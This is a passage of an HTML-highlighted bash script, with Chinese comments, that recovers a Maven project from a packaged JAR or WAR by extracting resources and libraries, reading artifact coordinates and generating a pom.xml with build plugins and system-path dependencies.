-o -iname <span class="string">&#x27;*.jsp&#x27;</span> -o -iname <span class="string">&#x27;*.jspx&#x27;</span> -o -iname <span class="string">&#x27;*.tag&#x27;</span> -o -iname <span class="string">&#x27;*.tld&#x27;</span> \</span><br><span class="line">         -o -iname <span class="string">&#x27;*.css&#x27;</span> -o -iname <span class="string">&#x27;*.js&#x27;</span> -o -iname <span class="string">&#x27;*.map&#x27;</span> \</span><br><span class="line">         -o -iname <span class="string">&#x27;*.png&#x27;</span> -o -iname <span class="string">&#x27;*.jpg&#x27;</span> -o -iname <span class="string">&#x27;*.jpeg&#x27;</span> -o -iname <span class="string">&#x27;*.gif&#x27;</span> -o -iname <span class="string">&#x27;*.svg&#x27;</span> -o -iname <span class="string">&#x27;*.ico&#x27;</span> \</span><br><span class="line">         -o -iname <span class="string">&#x27;*.woff&#x27;</span> -o -iname <span class="string">&#x27;*.woff2&#x27;</span> -o -iname <span class="string">&#x27;*.ttf&#x27;</span> -o -iname <span class="string">&#x27;*.eot&#x27;</span> \</span><br><span class="line">      \) -print0 2&gt;/dev/null \</span><br><span class="line">      | <span class="keyword">while</span> IFS= <span class="built_in">read</span> -r -d <span class="string">&#x27;&#x27;</span> f; <span class="keyword">do</span></span><br><span class="line">          <span class="comment"># 已经在 templates/static/public/META-INF/resources 的不重复</span></span><br><span class="line">          <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$f</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">            ./templates/*|./static/*|./public/*|./META-INF/resources/*) : ;;</span><br><span class="line">            *)</span><br><span class="line">              <span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="variable">$&#123;RES&#125;</span>/<span class="subst">$(dirname <span class="string">&quot;<span class="variable">$f</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">              <span class="built_in">cp</span> -f <span class="string">&quot;<span class="variable">$f</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;RES&#125;</span>/<span class="variable">$&#123;f&#125;</span>&quot;</span></span><br><span class="line">            ;;</span><br><span class="line">          <span class="keyword">esac</span></span><br><span class="line">        <span class="keyword">done</span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># WAR：还原到 webapp；同时提取 WEB-INF 除 classes/lib 外的配置/JSP</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$&#123;IS_WAR&#125;</span>&quot;</span> == <span class="string">&quot;true&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">  ok <span class="string">&quot;Copy webapp → <span class="variable">$&#123;WEB&#125;</span>&quot;</span></span><br><span class="line">  <span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="variable">$&#123;WEB&#125;</span>&quot;</span></span><br><span class="line">  (</span><br><span class="line">    <span class="built_in">cd</span> <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> * .*; <span class="keyword">do</span></span><br><span class="line">      [[ <span class="string">&quot;<span class="variable">$d</span>&quot;</span> == <span class="string">&quot;.&quot;</span> || <span class="string">&quot;<span class="variable">$d</span>&quot;</span> == <span class="string">&quot;..&quot;</span> || <span class="string">&quot;<span class="variable">$d</span>&quot;</span> == <span class="string">&quot;WEB-INF&quot;</span> ]] &amp;&amp; <span class="built_in">continue</span></span><br><span class="line">      [[ -e <span class="string">&quot;<span class="variable">$d</span>&quot;</span> ]] || <span class="built_in">continue</span></span><br><span class="line">      <span class="keyword">if</span> has rsync; <span class="keyword">then</span> rsync -a <span class="string">&quot;<span class="variable">$d</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;WEB&#125;</span>/&quot;</span> ; <span class="keyword">else</span> <span class="built_in">cp</span> -R <span class="string">&quot;<span class="variable">$d</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;WEB&#125;</span>/&quot;</span> ; <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">  )</span><br><span class="line">  <span class="keyword">if</span> [[ -d <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/WEB-INF&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    ( <span class="built_in">cd</span> <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/WEB-INF&quot;</span></span><br><span class="line">      <span class="keyword">for</span> x <span class="keyword">in</span> * .*; <span class="keyword">do</span></span><br><span class="line">        [[ <span class="string">&quot;<span class="variable">$x</span>&quot;</span> == <span class="string">&quot;.&quot;</span> || <span class="string">&quot;<span class="variable">$x</span>&quot;</span> == <span class="string">&quot;..&quot;</span> || <span class="string">&quot;<span class="variable">$x</span>&quot;</span> == <span class="string">&quot;classes&quot;</span> || <span class="string">&quot;<span class="variable">$x</span>&quot;</span> == <span class="string">&quot;lib&quot;</span> ]] &amp;&amp; <span class="built_in">continue</span></span><br><span class="line">        [[ -e <span class="string">&quot;<span class="variable">$x</span>&quot;</span> ]] || <span class="built_in">continue</span></span><br><span class="line">        <span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="variable">$&#123;WEB&#125;</span>/WEB-INF&quot;</span></span><br><span class="line">        <span class="keyword">if</span> has rsync; <span class="keyword">then</span> rsync -a <span class="string">&quot;<span class="variable">$x</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;WEB&#125;</span>/WEB-INF/&quot;</span>; <span class="keyword">else</span> <span class="built_in">cp</span> -R <span class="string">&quot;<span class="variable">$x</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;WEB&#125;</span>/WEB-INF/&quot;</span>; <span class="keyword">fi</span></span><br><span class="line">      <span class="keyword">done</span></span><br><span class="line">    )</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="comment"># 同时把 WEB-INF/classes 下资源拷到 classpath（一些老项目把 *.properties 放在这）</span></span><br><span class="line">  copy_resources_from_root <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/WEB-INF/classes&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="comment"># 普通 JAR 或 Spring Boot Fat JAR：把类路径资源拷到 src/main/resources</span></span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$&#123;IS_BOOT&#125;</span>&quot;</span> == <span class="string">&quot;true&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    copy_resources_from_root <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/BOOT-INF/classes&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment"># Plain jar：根路径下的资源</span></span><br><span class="line">    copy_resources_from_root <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### ====== 收集依赖 JAR 到 project/lib ======</span></span><br><span class="line">ok <span class="string">&quot;Collect libs → <span class="variable">$&#123;LIB&#125;</span>&quot;</span></span><br><span class="line">[[ -d <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/BOOT-INF/lib&quot;</span> ]] &amp;&amp; <span class="built_in">cp</span> <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/BOOT-INF/lib/&quot;</span>*.jar <span class="string">&quot;<span class="variable">$&#123;LIB&#125;</span>/&quot;</span> 2&gt;/dev/null || <span class="literal">true</span></span><br><span class="line">[[ -d <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/WEB-INF/lib&quot;</span> ]] &amp;&amp; <span class="built_in">cp</span> <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/WEB-INF/lib/&quot;</span>*.jar <span class="string">&quot;<span class="variable">$&#123;LIB&#125;</span>/&quot;</span> 2&gt;/dev/null || <span class="literal">true</span></span><br><span class="line">[[ -d <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/lib&quot;</span> ]] &amp;&amp; <span class="built_in">cp</span> <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/lib/&quot;</span>*.jar <span class="string">&quot;<span class="variable">$&#123;LIB&#125;</span>/&quot;</span> 2&gt;/dev/null || <span class="literal">true</span></span><br><span class="line"><span class="comment"># 有些打包会把第三方 jar 放在根</span></span><br><span class="line">find <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>&quot;</span> -maxdepth 1 -<span class="built_in">type</span> f -name <span class="string">&#x27;*.jar&#x27;</span> ! -name <span class="string">&#x27;app.bin&#x27;</span> -<span class="built_in">exec</span> <span class="built_in">cp</span> &#123;&#125; <span class="string">&quot;<span class="variable">$&#123;LIB&#125;</span>/&quot;</span> \; 2&gt;/dev/null || <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### ====== 读取坐标（GAV）并分类 ======</span></span><br><span class="line"><span class="comment"># 记录为 TSV：jarpath\tgroupId\tartifactId\tversion</span></span><br><span class="line">TMP_GAV=<span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/_gav.tsv&quot;</span></span><br><span class="line">: &gt; <span class="string">&quot;<span class="variable">$&#123;TMP_GAV&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">gav_from_jar</span></span>()&#123;</span><br><span class="line">  <span class="built_in">local</span> j=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">  <span class="comment"># 找 pom.properties</span></span><br><span class="line">  <span class="built_in">local</span> props</span><br><span class="line">  props=<span class="string">&quot;<span class="subst">$(list_zip <span class="string">&quot;<span class="variable">$j</span>&quot;</span> | grep -m1 &#x27;^META-INF/maven/.*/pom\.properties$&#x27; || true)</span>&quot;</span></span><br><span class="line">  <span class="keyword">if</span> [[ -n <span class="string">&quot;<span class="variable">$props</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># 提取并读内容</span></span><br><span class="line">    <span class="built_in">local</span> tmpd=<span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/_props&quot;</span></span><br><span class="line">    <span class="built_in">rm</span> -rf <span class="string">&quot;<span class="variable">$tmpd</span>&quot;</span>; <span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="variable">$tmpd</span>&quot;</span></span><br><span class="line">    extract_one <span class="string">&quot;<span class="variable">$j</span>&quot;</span> <span class="string">&quot;<span class="variable">$props</span>&quot;</span> <span class="string">&quot;<span class="variable">$tmpd</span>&quot;</span></span><br><span class="line">    <span class="built_in">local</span> g a v</span><br><span class="line">    g=<span class="string">&quot;<span class="subst">$(grep -m1 &#x27;^groupId=&#x27; <span class="string">&quot;<span class="variable">$&#123;tmpd&#125;</span>/<span class="variable">$&#123;props&#125;</span>&quot;</span> 2&gt;/dev/null | cut -d= -f2- || true)</span>&quot;</span></span><br><span class="line">    a=<span class="string">&quot;<span class="subst">$(grep -m1 &#x27;^artifactId=&#x27; <span class="string">&quot;<span class="variable">$&#123;tmpd&#125;</span>/<span class="variable">$&#123;props&#125;</span>&quot;</span> 2&gt;/dev/null | cut -d= -f2- || true)</span>&quot;</span></span><br><span class="line">    v=<span class="string">&quot;<span class="subst">$(grep -m1 &#x27;^version=&#x27; <span class="string">&quot;<span class="variable">$&#123;tmpd&#125;</span>/<span class="variable">$&#123;props&#125;</span>&quot;</span> 2&gt;/dev/null | cut -d= -f2- || true)</span>&quot;</span></span><br><span class="line">    g=<span class="string">&quot;<span class="subst">$(trim <span class="string">&quot;<span class="variable">$&#123;g:-&#125;</span>&quot;</span>)</span>&quot;</span>; a=<span class="string">&quot;<span class="subst">$(trim <span class="string">&quot;<span class="variable">$&#123;a:-&#125;</span>&quot;</span>)</span>&quot;</span>; v=<span class="string">&quot;<span class="subst">$(trim <span class="string">&quot;<span class="variable">$&#123;v:-&#125;</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">    <span class="keyword">if</span> [[ -n <span class="string">&quot;<span class="variable">$g</span>&quot;</span> &amp;&amp; -n <span class="string">&quot;<span class="variable">$a</span>&quot;</span> &amp;&amp; -n <span class="string">&quot;<span class="variable">$v</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">printf</span> <span class="string">&quot;%s\t%s\t%s\t%s\n&quot;</span> <span class="string">&quot;<span class="variable">$j</span>&quot;</span> <span class="string">&quot;<span class="variable">$g</span>&quot;</span> <span class="string">&quot;<span class="variable">$a</span>&quot;</span> <span class="string">&quot;<span class="variable">$v</span>&quot;</span></span><br><span class="line">      <span class="built_in">return</span> 0</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="comment"># 读不到就返回空坐标</span></span><br><span class="line">  <span class="built_in">printf</span> <span class="string">&quot;%s\t\t\t\n&quot;</span> <span class="string">&quot;<span class="variable">$j</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历 lib</span></span><br><span class="line"><span class="keyword">if</span> compgen -G <span class="string">&quot;<span class="variable">$&#123;LIB&#125;</span>/*.jar&quot;</span> &gt;/dev/null; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;LIB&#125;</span>/&quot;</span>*.jar; <span class="keyword">do</span></span><br><span class="line">    gav_from_jar <span class="string">&quot;<span class="variable">$j</span>&quot;</span> &gt;&gt; <span class="string">&quot;<span class="variable">$&#123;TMP_GAV&#125;</span>&quot;</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 去重策略：</span></span><br><span class="line"><span class="comment"># - 有坐标的：以 &quot;groupId:artifactId&quot; 去重，保留第一条</span></span><br><span class="line"><span class="comment"># - 无坐标的：以文件名去重</span></span><br><span class="line">TMP_GAV_U=<span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/_gav_u.tsv&quot;</span></span><br><span class="line">awk -F<span class="string">&#x27;\t&#x27;</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">  function key(g,a,fn)&#123; if(g!=&quot;&quot;&amp;&amp;a!=&quot;&quot;) return &quot;G:&quot; g &quot;:&quot; a; else return &quot;F:&quot; fn; &#125;</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    fn=$1; g=$2; a=$3; v=$4;</span></span><br><span class="line"><span class="string">    k=key(g,a,fn);</span></span><br><span class="line"><span class="string">    if(!(k in seen))&#123; seen[k]=1; print $0; &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="string">&quot;<span class="variable">$&#123;TMP_GAV&#125;</span>&quot;</span> &gt; <span class="string">&quot;<span class="variable">$&#123;TMP_GAV_U&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### ====== 嵌入式 POM（若存在） ======</span></span><br><span class="line">EMBED_POM=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> [[ -z <span class="string">&quot;<span class="variable">$&#123;EMBED_POM&#125;</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">  <span class="comment"># 优先 Fat JAR/META-INF/maven</span></span><br><span class="line">  <span class="keyword">if</span> compgen -G <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/META-INF/maven/*/*/pom.xml&quot;</span> &gt;/dev/null; <span class="keyword">then</span></span><br><span class="line">    EMBED_POM=<span class="string">&quot;<span class="subst">$(ls -1 <span class="string">&quot;<span class="variable">$&#123;STAGE&#125;</span>/META-INF/maven/&quot;</span>*/*/pom.xml | head -n1 || true)</span>&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主 POM 选择</span></span><br><span class="line">USE_EMBED_AS_MAIN=<span class="string">&quot;false&quot;</span></span><br><span class="line"><span class="keyword">if</span> [[ -n <span class="string">&quot;<span class="variable">$&#123;EMBED_POM&#125;</span>&quot;</span> &amp;&amp; <span class="string">&quot;<span class="variable">$&#123;POM_MODE&#125;</span>&quot;</span> == <span class="string">&quot;prefer-embedded&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">  USE_EMBED_AS_MAIN=<span class="string">&quot;true&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### ====== 生成 POM（auto / offline），并处理 WAR 的 provided 依赖 ======</span></span><br><span class="line">GROUP_ID=<span class="string">&quot;recovered.project&quot;</span>; ARTIFACT_ID=<span class="string">&quot;app-recovered&quot;</span>; VERSION=<span class="string">&quot;1.0-SNAPSHOT&quot;</span></span><br><span class="line">PACKAGING=<span class="string">&quot;jar&quot;</span>; [[ <span class="string">&quot;<span class="variable">$&#123;IS_WAR&#125;</span>&quot;</span> == <span class="string">&quot;true&quot;</span> ]] &amp;&amp; PACKAGING=<span class="string">&quot;war&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果有嵌入 POM，读出 GAV/packaging（尽量不失败）</span></span><br><span class="line"><span class="keyword">if</span> [[ -n <span class="string">&quot;<span class="variable">$&#123;EMBED_POM&#125;</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">  ok <span class="string">&quot;Found embedded POM: <span class="variable">$&#123;EMBED_POM&#125;</span>&quot;</span></span><br><span class="line">  <span class="built_in">cp</span> -f <span class="string">&quot;<span class="variable">$&#123;EMBED_POM&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;PROJ&#125;</span>/pom.original.xml&quot;</span></span><br><span class="line">  <span class="comment"># 简单解析（不强求）</span></span><br><span class="line">  G=<span class="string">&quot;<span class="subst">$(grep -m1 &#x27;&lt;groupId&gt;&#x27; <span class="string">&quot;<span class="variable">$&#123;EMBED_POM&#125;</span>&quot;</span> | sed -E &#x27;s/.*&lt;groupId&gt;([^&lt;]+)</span>.*/\1/&#x27; || true)&quot;</span></span><br><span class="line">  A=<span class="string">&quot;<span class="subst">$(grep -m1 &#x27;&lt;artifactId&gt;&#x27; <span class="string">&quot;<span class="variable">$&#123;EMBED_POM&#125;</span>&quot;</span> | sed -E &#x27;s/.*&lt;artifactId&gt;([^&lt;]+)</span>.*/\1/&#x27; || true)&quot;</span></span><br><span class="line">  V=<span class="string">&quot;<span class="subst">$(grep -m1 &#x27;&lt;version&gt;&#x27; <span class="string">&quot;<span class="variable">$&#123;EMBED_POM&#125;</span>&quot;</span> | sed -E &#x27;s/.*&lt;version&gt;([^&lt;]+)</span>.*/\1/&#x27; || true)&quot;</span></span><br><span class="line">  P=<span class="string">&quot;<span class="subst">$(grep -m1 &#x27;&lt;packaging&gt;&#x27; <span class="string">&quot;<span class="variable">$&#123;EMBED_POM&#125;</span>&quot;</span> | sed -E &#x27;s/.*&lt;packaging&gt;([^&lt;]+)</span>.*/\1/&#x27; || true)&quot;</span></span><br><span class="line">  [[ -n <span class="string">&quot;<span class="variable">$G</span>&quot;</span> ]] &amp;&amp; GROUP_ID=<span class="string">&quot;<span class="variable">$G</span>&quot;</span></span><br><span class="line">  [[ -n <span class="string">&quot;<span class="variable">$A</span>&quot;</span> ]] &amp;&amp; ARTIFACT_ID=<span class="string">&quot;<span class="variable">$A</span>&quot;</span></span><br><span class="line">  [[ -n <span class="string">&quot;<span class="variable">$V</span>&quot;</span> ]] &amp;&amp; VERSION=<span class="string">&quot;<span class="variable">$V</span>&quot;</span></span><br><span class="line">  [[ -n <span class="string">&quot;<span class="variable">$P</span>&quot;</span> ]] &amp;&amp; PACKAGING=<span class="string">&quot;<span class="variable">$P</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">POM_AUTO=<span class="string">&quot;<span class="variable">$&#123;PROJ&#125;</span>/pom.auto.xml&quot;</span></span><br><span class="line">POM_OFF=<span class="string">&quot;<span class="variable">$&#123;PROJ&#125;</span>/pom.offline.xml&quot;</span></span><br><span class="line">POM_MAIN=<span class="string">&quot;<span class="variable">$&#123;PROJ&#125;</span>/pom.xml&quot;</span> <span class="comment"># 最终主 POM（由 POM_MODE 决定）</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">write_build_plugins</span></span>()&#123;</span><br><span class="line">  <span class="comment"># $1=packaging</span></span><br><span class="line">  <span class="built_in">local</span> pk=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">  <span class="built_in">cat</span> &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">  &lt;build&gt;</span></span><br><span class="line"><span class="string">    &lt;plugins&gt;</span></span><br><span class="line"><span class="string">      &lt;plugin&gt;</span></span><br><span class="line"><span class="string">        &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span></span><br><span class="line"><span class="string">        &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">        &lt;version&gt;3.11.0&lt;/version&gt;</span></span><br><span class="line"><span class="string">        &lt;configuration&gt;</span></span><br><span class="line"><span class="string">          &lt;release&gt;\$&#123;maven.compiler.release&#125;&lt;/release&gt;</span></span><br><span class="line"><span class="string">          &lt;encoding&gt;\$&#123;project.build.sourceEncoding&#125;&lt;/encoding&gt;</span></span><br><span class="line"><span class="string">          &lt;compilerArgs&gt;</span></span><br><span class="line"><span class="string">            &lt;arg&gt;-Xlint:-options&lt;/arg&gt;</span></span><br><span class="line"><span class="string">          &lt;/compilerArgs&gt;</span></span><br><span class="line"><span class="string">        &lt;/configuration&gt;</span></span><br><span class="line"><span class="string">      &lt;/plugin&gt;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$pk</span>&quot;</span> == <span class="string">&quot;war&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">cat</span> &lt;&lt;<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">      &lt;plugin&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;maven-war-plugin&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.3.2&lt;/version&gt;</span><br><span class="line">        &lt;configuration&gt;</span><br><span class="line">          &lt;failOnMissingWebXml&gt;<span class="literal">false</span>&lt;/failOnMissingWebXml&gt;</span><br><span class="line">          &lt;warSourceDirectory&gt;src/main/webapp&lt;/warSourceDirectory&gt;</span><br><span class="line">        &lt;/configuration&gt;</span><br><span class="line">      &lt;/plugin&gt;</span><br><span class="line">EOF</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="built_in">cat</span> &lt;&lt;<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">    &lt;/plugins&gt;</span><br><span class="line">  &lt;/build&gt;</span><br><span class="line">EOF</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成 pom.auto.xml（在线友好 + 指定前缀强制 systemPath）</span></span><br><span class="line">ok <span class="string">&quot;Generate <span class="variable">$&#123;POM_AUTO&#125;</span>&quot;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">cat</span> &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="line"><span class="string">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line"><span class="string">         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span></span><br><span class="line"><span class="string">  &lt;groupId&gt;$&#123;GROUP_ID&#125;&lt;/groupId&gt;</span></span><br><span class="line"><span class="string">  &lt;artifactId&gt;$&#123;ARTIFACT_ID&#125;&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">  &lt;version&gt;$&#123;VERSION&#125;&lt;/version&gt;</span></span><br><span class="line"><span class="string">  &lt;packaging&gt;$&#123;PACKAGING&#125;&lt;/packaging&gt;</span></span><br><span class="line"><span class="string">  &lt;properties&gt;</span></span><br><span class="line"><span class="string">    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;</span></span><br><span class="line"><span class="string">    &lt;maven.compiler.release&gt;$&#123;JAVA_RELEASE&#125;&lt;/maven.compiler.release&gt;</span></span><br><span class="line"><span class="string">  &lt;/properties&gt;</span></span><br><span class="line"><span class="string">  &lt;dependencies&gt;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># WAR 注入 provided</span></span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$&#123;PACKAGING&#125;</span>&quot;</span> == <span class="string">&quot;war&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">cat</span> &lt;&lt;<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;3.1.0&lt;/version&gt;</span><br><span class="line">      &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;javax.servlet.jsp&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;javax.servlet.jsp-api&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;2.3.1&lt;/version&gt;</span><br><span class="line">      &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">EOF</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 遍历依赖</span></span><br><span class="line">  <span class="keyword">while</span> IFS=$<span class="string">&#x27;\t&#x27;</span> <span class="built_in">read</span> -r jar g a v; <span class="keyword">do</span></span><br><span class="line">    base=<span class="string">&quot;<span class="subst">$(basename <span class="string">&quot;<span class="variable">$jar</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">    name=<span class="string">&quot;<span class="variable">$&#123;base%.jar&#125;</span>&quot;</span></span><br><span class="line">    <span class="comment"># 若无坐标，用文件名猜版本</span></span><br><span class="line">    <span class="keyword">if</span> [[ -z <span class="string">&quot;<span class="variable">$g</span>&quot;</span> || -z <span class="string">&quot;<span class="variable">$a</span>&quot;</span> || -z <span class="string">&quot;<span class="variable">$v</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">      guess_v=<span class="string">&quot;<span class="variable">$&#123;name##*-&#125;</span>&quot;</span></span><br><span class="line">      guess_a=<span class="string">&quot;<span class="variable">$&#123;name%-<span class="variable">$&#123;guess_v&#125;</span>&#125;</span>&quot;</span></span><br><span class="line">      <span class="keyword">if</span> [[ -z <span class="string">&quot;<span class="variable">$guess_a</span>&quot;</span> || <span class="string">&quot;<span class="variable">$guess_a</span>&quot;</span> == <span class="string">&quot;<span class="variable">$name</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">        guess_a=<span class="string">&quot;<span class="variable">$name</span>&quot;</span>; guess_v=<span class="string">&quot;1.0&quot;</span></span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">      g=<span class="string">&quot;local.libs&quot;</span>; a=<span class="string">&quot;<span class="variable">$guess_a</span>&quot;</span>; v=<span class="string">&quot;<span class="variable">$guess_v</span>&quot;</span></span><br><span class="line">      <span class="comment"># 直接 systemPath</span></span><br><span class="line">      <span class="built_in">cat</span> &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">    &lt;dependency&gt;</span></span><br><span class="line"><span class="string">      &lt;groupId&gt;$&#123;g&#125;&lt;/groupId&gt;</span></span><br><span class="line"><span class="string">      &lt;artifactId&gt;$&#123;a&#125;&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">      &lt;version&gt;$&#123;v&#125;&lt;/version&gt;</span></span><br><span class="line"><span class="string">      &lt;scope&gt;system&lt;/scope&gt;</span></span><br><span class="line"><span class="string">      &lt;systemPath&gt;\$&#123;project.basedir&#125;/lib/$&#123;base&#125;&lt;/systemPath&gt;</span></span><br><span class="line"><span class="string">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="comment"># 有坐标：命中前缀 =&gt; 强制 systemPath；否则正常坐标</span></span><br><span class="line">      <span class="keyword">if</span> should_systemize <span class="string">&quot;<span class="variable">$g</span>&quot;</span>; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">cat</span> &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">    &lt;dependency&gt;</span></span><br><span class="line"><span class="string">      &lt;groupId&gt;$&#123;g&#125;&lt;/groupId&gt;</span></span><br><span class="line"><span class="string">      &lt;artifactId&gt;$&#123;a&#125;&lt;/artifactId&gt;</span></span><br><span class="line"><span class="string">      &lt;version&gt;$&#123;v&#125;&lt;/version&gt;</span></span><br><span class="line"><span class="string">      &lt;scope&gt;system&lt;/scope&gt;</span></span><br><span class="line"><span class="string">      &lt;systemPath&gt;\$&#123;project.basedir&#125;/lib/$&#123;base&#125;&lt;/systemPath&gt;</span></span><br><span class="line"><span class="string">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span 